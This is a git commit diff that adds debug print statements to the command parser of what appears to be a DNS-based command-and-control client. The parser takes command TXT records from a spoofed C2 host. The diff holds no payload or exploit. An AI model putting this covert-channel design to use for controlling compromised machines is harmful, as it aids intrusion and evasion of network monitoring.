b87f8080a7bb09688eff63a65294db20cb3036e2
devhid <devhid@users.noreply.github.com>
2019-05-04 03:37:06 -0400

    more output

--- client/command/cmdparser.py
+++ client/command/cmdparser.py
@@ -10,14 +10,18 @@ class CommandParser:
         if not response.haslayer('DNS'):
             return None
 
+        print(response)
         an = response['DNS'].an
         if an == None:
+            print("[Sniffer] No answer found for response.")
             return None
 
         if an.type != PACKET_OPTIONS['DNS']['AN']['TYPE']:
+            print("[Sniffer] Response not of type 'TXT'.")
             return None
 
         if an.rrname != CC_SERVER_SPOOFED_HOST + ".":
+            print("[Sniffer] Spoofed host not matching.")
             return None
 
         if isinstance(an.rdata, list):
